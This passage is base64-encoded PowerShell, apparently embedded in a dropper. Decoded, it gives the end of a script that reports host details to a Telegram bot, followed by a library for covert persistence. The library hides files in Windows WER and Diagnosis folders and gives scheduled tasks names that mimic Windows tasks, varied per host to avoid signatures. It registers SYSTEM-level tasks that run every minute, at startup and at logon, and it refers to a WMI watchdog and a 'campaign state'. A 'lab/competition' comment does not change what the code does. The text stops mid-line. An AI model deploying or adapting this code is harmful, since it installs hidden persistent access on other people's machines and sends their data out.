IGRpZ2VzdCBtb2RlOiBvbmUgc2hvcnQgbGluZSwgSFRNTC1mcmVlIChob3VybHkgaGVhcnRiZWF0
KQ0KaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsNCiAgICAkZm9yZWlnbk4gPSAwDQogICAgaWYg
KCRzdGF0ZU9iaiAtYW5kICRzdGF0ZU9iai5mb3JlaWduKSB7ICRmb3JlaWduTiA9IEAoJHN0YXRl
T2JqLmZvcmVpZ24pLkNvdW50IH0NCiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lD
YWNoZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3Ro
IC8gMUtCKSB9IGVsc2UgeyAnMCcgfQ0KICAgICRwcmltU2hvcnQgPSBpZiAoJHByaW1PaykgeyAn
T0snIH0gZWxzZSB7ICdET1dOJyB9DQogICAgJGFsdFNob3J0ID0gaWYgKCRhbHRMaW5lIC1saWtl
ICdSdW5uaW5nKicpIHsgJ09LJyB9IGVsc2UgeyAnLScgfQ0KICAgICR0ZXh0ID0gIiRlbW9qaSBT
Q0R8JCgkZW52OkNPTVBVVEVSTkFNRSl8cHJpbT0kcHJpbVNob3J0fGFsdD0kYWx0U2hvcnR8Zm9y
ZWlnbj0kZm9yZWlnbk58dGFza3M9JHRhc2tPay81fG1zaT0kbXNpU2hvcnR8dXA9JHVwdGltZXxi
PSRCdWlsZHwkbm93Ig0KfQ0KDQppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJt
bUhpdHMgPSBAKCgkcm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4u
ICh7MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0ID0gQCgo
JHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0gLi4uICh7MH0gbW9yZSkn
IC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQ0KICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAs
IDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0N
Cg0KJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5kLVRn
KFtzdHJpbmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAgICAg
ICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQogICAgICAgIHRleHQg
ICAgICAgICAgICAgICAgICAgICA9ICRtc2cNCiAgICAgICAgZGlzYWJsZV93ZWJfcGFnZV9wcmV2
aWV3ID0gJHRydWUNCiAgICB9DQogICAgaWYgKCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUg
PSAkbW9kZSB9DQogICAgJGpzb24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVz
cyAtRGVwdGggNQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0
Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBzOi8vYXBpLnRl
bGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VOKS9zZW5kTWVzc2FnZSIpIGANCiAgICAgICAg
LU1ldGhvZCBQb3N0IC1Cb2R5ICRieXRlcyAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247
IGNoYXJzZXQ9dXRmLTgnIHwgT3V0LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0
cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0cnkg
ew0KICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAgICByZXR1
cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIFNlbmQt
VGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+
IikgLW1vZGUgJG1vZGUNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNo
IHsNCiAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdHJ5
IHsNCiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAgICAg
ICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3JpY2gnIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBlbHNlIHsNCiAgICAgICAgdGhyb3cg
J2h0bWxfZmFpbGVkJw0KICAgIH0NCiAgICBpZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAg
ICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIg
KyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1D
b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lfdGcuZmxhZycp
IC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4
XTo6UmVwbGFjZSgkdGV4dCwgJzxbXj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3Rl
bS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWlu
Lkxlbmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1MDApICsg
ImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cgJHBsYWluIC1tb2RlICcn
IHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVl
ICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0
Y2ggew0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19m
YWlsICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDEyCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTI6IElERU5UVkVSPTcg
Uk9PVC1sZXZlbCB0YXNrIG5hbWVzLiBOZXN0ZWQgXE1pY3Jvc29mdFxXaW5kb3dzXCogY3JlYXRl
cwojICAgICAgYXJlIEFjY2VzcyBEZW5pZWQgZmxlZXQtd2lkZSAodmVyaWZ5X3Rhc2tBLURfRkFJ
TCk7IFdNSSArIFd1Y2FjaGVPd24gT0suCiMgTDExOiBORVZFUiByZXVzZSByZWFsIFdpbmRvd3Mg
YnVpbHQtaW4gdGFzayBuYW1lczsgVFIgb3duZXJzaGlwIGNoZWNrcy4KIyBMODogVGVzdC1TQ1Jl
Z2lzdGVyZWQgZml4ZWQgKEZvckVhY2gtT2JqZWN0IHJldHVybiBuZXZlciBsZWZ0IGZ1bmN0aW9u
KTsKIyAgICAgRGlzcGxheU5hbWUgLWllcSBleGFjdCBtYXRjaDsgcmVwYWlyIEdVSUQgd2FsayB1
c2VzIGZvcmVhY2g7CiMgICAgIFNDIHJlc2VhcmNoOiBwZXItRlAgVXBncmFkZUNvZGUgKyBsZWdh
Y3kgZmFtaWx5IFVwZ3JhZGUgcm93cyBtZWFuCiMgICAgIG1zaWV4ZWMgL2kgb2YgcHJpbWFyeSBj
YW4gcmVtb3ZlIHNpYmxpbmdzIC0gcHJlZmVyIC9mYSBhbHdheXMuCiMgTDc6IEZJWEVEIFdPVzY0
MzJOb2RlIHVuaW5zdGFsbCBoaXZlIHBhdGg7IGhhcmRlbmVkIEludm9rZS1FeHRlcm1pbmF0ZS4K
IyBBdXRob3JpemVkIGludGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUg
b25seS4KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZAKW0NtZGxldEJpbmRpbmcoKV0KcGFyYW0oCiAgICBb
UGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3
YXRjaGRvZycsICd3YXRjaGRvZy1lbnN1cmUnLCAndGFza3MtZW5zdXJlJywgJ3N0YXRlJywgJ2lk
ZW50aXR5JywgJ3JlcGFpcicsICdyZWdpc3RlcmVkJywgJ2V4dGVybWluYXRlJyldCiAgICBbc3Ry
aW5nXSRBY3Rpb24sCiAgICBbc3RyaW5nXSRXb3JrRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jv
c29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlJywKICAgIFtzdHJpbmddJE1vblBhdGggPSAn
JywKICAgIFtzdHJpbmddJEJ1aWxkICA9ICdPMTUnLAogICAgW3N0cmluZ10kRXh0cmEgID0gJycs
CiAgICBbc3RyaW5nXSRGcCAgICAgPSAnJwopCgokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1Np
bGVudGx5Q29udGludWUnCiRjZmdQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5j
ZmcnCiRJZGVudFZlcnNpb24gPSA3CgojIFJPT1QtbGV2ZWwgdGFzayBuYW1lcyBvbmx5IChzaW5n
bGUgcGF0aCBzZWdtZW50KS4gTmVzdGVkIE1pY3Jvc29mdFxXaW5kb3dzXCoKIyBmb2xkZXJzIHJl
amVjdCBDcmVhdGUgd2l0aCBBY2Nlc3MgRGVuaWVkIG9uIFdpbjEwLzExIEhvbWUrUHJvIChmbGVl
dCBPMzIpLgokUG9vbHMgPSBAewogICAgQSA9IEAoJ1xXZXJRdWV1ZVN5bmMnLCdcRGlhZ0hvc3RD
YWNoZScsJ1xOZXRUcmFjZUNhY2hlJywnXFdkaUhvc3RQcm94eScsJ1xQbGFTZXJ2ZXJIZWFsdGgn
LCdcVGNwSXBDb25mbGljdFJlcycsJ1xTckNhY2hlU3luYycsJ1xSZXNvbHV0aW9uUXVldWUnKQog
ICAgQiA9IEAoJ1xQbGFTZXJ2ZXJIZWFsdGgnLCdcV2RpSG9zdFByb3h5JywnXFdlclF1ZXVlU3lu
YycsJ1xOZXRUcmFjZUNhY2hlJywnXERpYWdIb3N0Q2FjaGUnLCdcVGNwSXBDb25mbGljdFJlcycs
J1xQbGFTZXJ2ZXJEaWFnJywnXFNyQ2FjaGVTeW5jJykKICAgIEMgPSBAKCdcUmVzb2x1dGlvblF1
ZXVlJywnXE5ldFRyYWNlQ2FjaGUnLCdcVGNwSXBDb25mbGljdFJlcycsJ1xXZXJRdWV1ZVN5bmMn
LCdcUGxhU2VydmVySGVhbHRoJywnXERpYWdIb3N0Q2FjaGUnLCdcUGxhU2VydmVyRGlhZycsJ1xX
ZGlIb3N0UHJveHknKQogICAgRCA9IEAoJ1xUY3BJcENvbmZsaWN0UmVzJywnXFJlc29sdXRpb25R
dWV1ZScsJ1xOZXRUcmFjZUNhY2hlJywnXERpYWdIb3N0Q2FjaGUnLCdcUGxhU2VydmVyRGlhZycs
J1xXZXJRdWV1ZVN5bmMnLCdcUGxhU2VydmVySGVhbHRoJywnXFdkaUhvc3RQcm94eScpCn0KJERl
ZmF1bHRzID0gW29yZGVyZWRdQHsKICAgIFRBU0tfQSA9ICdcV2VyUXVldWVTeW5jJwogICAgVEFT
S19CID0gJ1xQbGFTZXJ2ZXJIZWFsdGgnCiAgICBUQVNLX0MgPSAnXFdkaUhvc3RQcm94eScKICAg
IFRBU0tfRCA9ICdcVGNwSXBDb25mbGljdFJlcycKICAgIE1PX0EgICA9ICcyJwogICAgTU9fQiAg
ID0gJzMnCn0KCmZ1bmN0aW9uIEdldC1Ib3N0U2VlZCB7CiAgICAkcyA9IDBMCiAgICBmb3JlYWNo
ICgkYyBpbiAkZW52OkNPTVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9
ICgkcyAqIDMxICsgW2ludF0kYykgJSAxMDAwMDAwMDA3IH0KICAgIHJldHVybiAkcwp9CgpmdW5j
dGlvbiBSZWFkLUlkZW50aXR5IHsKICAgICRpZCA9ICREZWZhdWx0cy5DbG9uZSgpCiAgICBpZiAo
VGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAgICAgZm9yZWFjaCAoJGxpbmUgaW4gKEdldC1Db250
ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UpKSB7CiAgICAgICAgICAgIGlmICgkbGlu
ZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRbJG1hdGNoZXNb
MV1dID0gJG1hdGNoZXNbMl0gfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkaWQKfQoKZnVu
Y3Rpb24gUmVtb3ZlLVRhc2tRdWlldChbc3RyaW5nXSR0bikgewogICAgaWYgKCR0bikgeyAmIHNj
aHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4gL0YgMj4mMSB8IE91dC1OdWxsIH0KfQoKZnVuY3Rp
b24gR2V0LVRhc2tWZXJib3NlQmxvYihbc3RyaW5nXSR0bikgewogICAgaWYgKC1ub3QgJHRuKSB7
IHJldHVybiAnJyB9CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZP
IExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91
dCkgeyByZXR1cm4gJycgfQogICAgcmV0dXJuICgoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsgIiRf
IiB9KSAtam9pbiAiYG4iKQp9CgpmdW5jdGlvbiBUZXN0LVRhc2tPd25zTW9uKFtzdHJpbmddJHRu
LCBbc3RyaW5nXSRtYXJrZXIpIHsKICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBzY2hlZHVsZWQgYWN0
aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBub3QgYSBXaW5kb3dzIENPTSBoYW5k
bGVyLgogICAgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bgogICAgaWYgKC1ub3QgJGJs
b2IpIHsgcmV0dXJuICRmYWxzZSB9CiAgICBpZiAoJG1hcmtlciAtYW5kICgkYmxvYiAtbWF0Y2gg
W3JlZ2V4XTo6RXNjYXBlKCRtYXJrZXIpKSkgeyByZXR1cm4gJHRydWUgfQogICAgaWYgKCRibG9i
IC1tYXRjaCAnKD9pKVwud3VjYWNoZVxcfG93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8XC5ldGxj
YWNoZVxcJykgeyByZXR1cm4gJHRydWUgfQogICAgcmV0dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBJ
bml0aWFsaXplLUlkZW50aXR5IHsKICAgICMgSWRlbXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIg
Z2VuZXJhdGlvbi4gUG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOgogICAgIyBvd25lZCBvbGQt
bmFtZSB0YXNrcyBhcmUgZGVsZXRlZDsgV2luZG93cyBidWlsdC1pbnMgd2l0aCBzYW1lIG5hbWUg
YXJlIGxlZnQgYWxvbmUuCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAgICAgJG9s
ZCA9IFJlYWQtSWRlbnRpdHkKICAgICAgICAjIEw3OiBhbHNvIHJlZ2VuZXJhdGUgaWYgYW55IFRB
U0tfKiBpcyBlbXB0eSAoTDQtTDYgbW9kdWxvL2Nhc3QgYnVncyBsZWZ0IGJsYW5rIHNsb3RzKQog
ICAgICAgICRzbG90c09rID0gKCRvbGRbJ0lERU5UVkVSJ10gLWVxICIkSWRlbnRWZXJzaW9uIikg
LWFuZCAkb2xkWydUQVNLX0EnXSAtYW5kICRvbGRbJ1RBU0tfQiddIC1hbmQgJG9sZFsnVEFTS19D
J10gLWFuZCAkb2xkWydUQVNLX0QnXQogICAgICAgIGlmICgkc2xvdHNPaykgeyByZXR1cm4gJG9s
ZCB9CiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RB
U0tfRCcpIHsKICAgICAgICAgICAgJHRuID0gW3N0cmluZ10kb2xkWyRrXQogICAgICAgICAgICBp
ZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQogICAgICAgICAgICAjIE5ldmVyIGRlbGV0ZSBhIHJl
YWwgV2luZG93cyB0YXNrIHdlIG5ldmVyIG93bmVkIChUUiBpcyBDT00vY3VzdG9tIGhhbmRsZXIp
LgogICAgICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJycpIHsgUmVtb3ZlLVRhc2tR
dWlldCAkdG4gfQogICAgICAgIH0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGNm
Z1BhdGggLUZvcmNlCiAgICB9CiAgICAkcyA9IEdldC1Ib3N0U2VlZAogICAgIyBMNDogdHdvIHNs
b3RzIG1heSBoYXNoIHRvIHRoZSBzYW1lIHRhc2sgcGF0aCAocG9vbHMgc2hhcmUgbmFtZXMpIC0+
CiAgICAjIG9uZSBwaHlzaWNhbCB0YXNrIHRoZW4gc2F0aXNmaWVzIHR3byBzbG90cyBhbmQgdGhl
IGZsZWV0IHNob3dzIDMvNC4KICAgICMgV2FsayBlYWNoIHBvb2wgZm9yd2FyZCB1bnRpbCB0aGUg
cGljayBpcyB1bmlxdWUgYWNyb3NzIHNsb3RzLgogICAgIyBMNjogdGhlIG9sZCBAKEAoJ0EnLCAk
cyAlIDgpLCAuLi4pIGZvcm0gd2FzIGRvdWJsZS1icm9rZW4gaW4gUFMgNS4xOgogICAgIyBiYXJl
ICUgaW5zaWRlIEAoKSBwYXJzZXMgYXMgdGhlIEZvckVhY2gtT2JqZWN0IGFsaWFzIChub3QgbW9k
dWxvKSwgc28gdGhlCiAgICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFuZCB0aGUgbG9vcCBuZXZl
ciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQogICAgIyBUQVNLXyogYW5kIHRoZSB3aG9s
ZSBmbGVldCBmZWxsIGJhY2sgdG8gaWRlbnRpY2FsIGRlZmF1bHQgdGFzayBuYW1lcy4KICAgICRz
ZWVkcyA9IFtvcmRlcmVkXUB7CiAgICAgICAgQSA9ICgkcyAlIDgpCiAgICAgICAgQiA9ICgoJHMg
KyAzKSAlIDgpCiAgICAgICAgQyA9ICgoJHMgKyA1KSAlIDgpCiAgICAgICAgRCA9ICgoJHMgKyA3
KSAlIDgpCiAgICB9CiAgICAkcGljayA9IFtvcmRlcmVkXUB7fQogICAgZm9yZWFjaCAoJGxldHRl
ciBpbiAnQScsJ0InLCdDJywnRCcpIHsKICAgICAgICAkaSA9IFtpbnRdJHNlZWRzWyRsZXR0ZXJd
CiAgICAgICAgJG5hbWUgPSAkUG9vbHNbJGxldHRlcl1bJGldCiAgICAgICAgJG4gPSAwCiAgICAg
ICAgd2hpbGUgKCRwaWNrLlZhbHVlcyAtY29udGFpbnMgJG5hbWUgLWFuZCAkbiAtbHQgOCkgeyAk
aSA9ICgkaSArIDEpICUgODsgJG5hbWUgPSAkUG9vbHNbJGxldHRlcl1bJGldOyAkbisrIH0KICAg
ICAgICBpZiAoLW5vdCAkbmFtZSkgeyAkbmFtZSA9ICREZWZhdWx0c1siVEFTS18kbGV0dGVyIl0g
fQogICAgICAgICRwaWNrWyRsZXR0ZXJdID0gJG5hbWUKICAgIH0KICAgICRjZmcgPSBAKAogICAg
ICAgICJUQVNLX0E9JCgkcGljay5BKSIKICAgICAgICAiVEFTS19CPSQoJHBpY2suQikiCiAgICAg
ICAgIlRBU0tfQz0kKCRwaWNrLkMpIgogICAgICAgICJUQVNLX0Q9JCgkcGljay5EKSIKICAgICAg
ICAiTU9fQT0kKDIgKyAoJHMgJSA0KSkiICAgICAgICAgICMgMi01IG1pbiBqaXR0ZXIKICAgICAg
ICAiTU9fQj0kKDMgKyAoKCRzICsgMSkgJSAzKSkiICAgICMgMy01IG1pbiBqaXR0ZXIKICAgICAg
ICAiU0VFRD0kcyIKICAgICAgICAiSURFTlRWRVI9JElkZW50VmVyc2lvbiIKICAgICkKICAgIFNl
dC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UKICAgIHJl
dHVybiAoUmVhZC1JZGVudGl0eSkKfQoKZnVuY3Rpb24gV3JpdGUtT3duTG9nKFtzdHJpbmddJG0p
IHsKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJwogICAgdHJ5IHsgQWRk
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9IGNhdGNoIHt9Cn0K
CmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3MgewogICAgIyBDcmVhdGUvcmVwYWlyIEEtRCBv
bmx5IHdoZW4gbWlzc2luZyBPUiBUYXNrIFRvIFJ1biBpcyBub3Qgb3VycyAoV2luZG93cyBjb2xs
aXNpb24pLgogICAgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eQogICAgaWYgKC1ub3QgJE1vblBh
dGgpIHsgJE1vblBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJyB9CiAgICAk
ZXRsRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNh
Y2hlJwogICAgJGV0bE1vbiA9IEpvaW4tUGF0aCAkZXRsRGlyICdldGxfbW9uLmNtZCcKICAgIGlm
ICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRldGxEaXIpKSB7IE5ldy1JdGVtIC1JdGVt
VHlwZSBEaXJlY3RvcnkgLVBhdGggJGV0bERpciAtRm9yY2UgfCBPdXQtTnVsbCB9CiAgICBpZiAo
VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCkgewogICAgICAgIHRyeSB7IENvcHktSXRl
bSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRldGxNb24gLUZvcmNlIH0gY2F0
Y2gge30KICAgIH0KICAgICRtb0EgPSBbc3RyaW5nXSRpZFsnTU9fQSddOyBpZiAoLW5vdCAkbW9B
KSB7ICRtb0EgPSAnMicgfQogICAgJG1vQiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90
ICRtb0IpIHsgJG1vQiA9ICczJyB9CiAgICAkc3BlY3MgPSBAKAogICAgICAgIEB7IEtleSA9ICdU
QVNLX0EnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7
IFRyID0gImNtZC5leGUgL2MgJE1vblBhdGgiIH0KICAgICAgICBAeyBLZXkgPSAnVEFTS19CJzsg
TWFya2VyID0gJ2V0bF9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9COyBUciA9ICJj
bWQuZXhlIC9jICRldGxNb24iIH0KICAgICAgICBAeyBLZXkgPSAnVEFTS19DJzsgTWFya2VyID0g
J293bl9tb24uY21kJzsgU2MgPSAnT05TVEFSVCc7IE1vID0gJyc7IFRyID0gImNtZC5leGUgL2Mg
JE1vblBhdGgiIH0KICAgICAgICBAeyBLZXkgPSAnVEFTS19EJzsgTWFya2VyID0gJ293bl9tb24u
Y21kJzsgU2MgPSAnT05MT0dPTic7IE1vID0gJyc7IFRyID0gImNtZC5leGUgL2MgJE1vblBhdGgi
IH0KICAgICkKICAgICRvayA9IDA7ICRyZWFybWVkID0gMDsgJGZhaWwgPSAwCiAgICBmb3JlYWNo
ICgkc3AgaW4gJHNwZWNzKSB7CiAgICAgICAgJHRuID0gW3N0cmluZ10kaWRbJHNwLktleV0KICAg
ICAgICBpZiAoLW5vdCAkdG4pIHsgJGZhaWwrKzsgY29udGludWUgfQogICAgICAgIGlmIChUZXN0
LVRhc2tPd25zTW9uICR0biAkc3AuTWFya2VyKSB7ICRvaysrOyBjb250aW51ZSB9CiAgICAgICAg
JGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bgogICAgICAgICRleGlzdHMgPSBbYm9vbF0k
YmxvYgogICAgICAgIGlmICgkZXhpc3RzKSB7CiAgICAgICAgICAgICMgTGVhdmUgcmVhbCBXaW5k
b3dzIHRhc2tzIGFsb25lLiBPbmx5IHJlcGxhY2UgaWYgdGhpcyB3YXMgYWxyZWFkeSBvdXIgYWN0
aW9uLgogICAgICAgICAgICAkb3Vyc0Jyb2tlbiA9ICgkYmxvYiAtbWF0Y2ggJyg/aSlvd25fbW9u
XC5jbWR8ZXRsX21vblwuY21kfFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpCiAgICAgICAgICAg
IGlmICgtbm90ICRvdXJzQnJva2VuKSB7ICRmYWlsKys7IGNvbnRpbnVlIH0KICAgICAgICAgICAg
UmVtb3ZlLVRhc2tRdWlldCAkdG4KICAgICAgICB9CiAgICAgICAgJGFyZ3MgPSBAKCcvQ3JlYXRl
JywgJy9UTicsICR0biwgJy9SVScsICdTWVNURU0nLCAnL1JMJywgJ0hJR0hFU1QnLCAnL0YnLCAn
L1RSJywgJHNwLlRyLCAnL1NDJywgJHNwLlNjKQogICAgICAgIGlmICgkc3AuU2MgLWVxICdNSU5V
VEUnIC1hbmQgJHNwLk1vKSB7ICRhcmdzICs9IEAoJy9NTycsICRzcC5NbykgfQogICAgICAgICRj
cmVhdGVPdXQgPSAmIHNjaHRhc2tzLmV4ZSBAYXJncyAyPiYxIHwgRm9yRWFjaC1PYmplY3QgeyAi
JF8iIH0KICAgICAgICAkY3JlYXRlVHh0ID0gKCRjcmVhdGVPdXQgLWpvaW4gJyAnKS5UcmltKCkK
ICAgICAgICBpZiAoJGNyZWF0ZVR4dCkgeyBXcml0ZS1Pd25Mb2cgInRhc2tzX2NyZWF0ZSAkKCRz
cC5LZXkpICR0biA9PiAkY3JlYXRlVHh0IiB9CiAgICAgICAgaWYgKFRlc3QtVGFza093bnNNb24g
JHRuICRzcC5NYXJrZXIpIHsKICAgICAgICAgICAgJHJlYXJtZWQrKwogICAgICAgICAgICBpZiAo
JHNwLktleSAtZXEgJ1RBU0tfQScgLW9yICRzcC5LZXkgLWVxICdUQVNLX0InKSB7CiAgICAgICAg
ICAgICAgICAmIHNjaHRhc2tzLmV4ZSAvUnVuIC9UTiAkdG4gMj4mMSB8IE91dC1OdWxsCiAgICAg
ICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkZmFpbCsrCiAgICAgICAgICAg
IFdyaXRlLU93bkxvZyAidGFza3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iCiAgICAgICAg
fQogICAgfQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVhcm1lZCBmYWlsPSRm
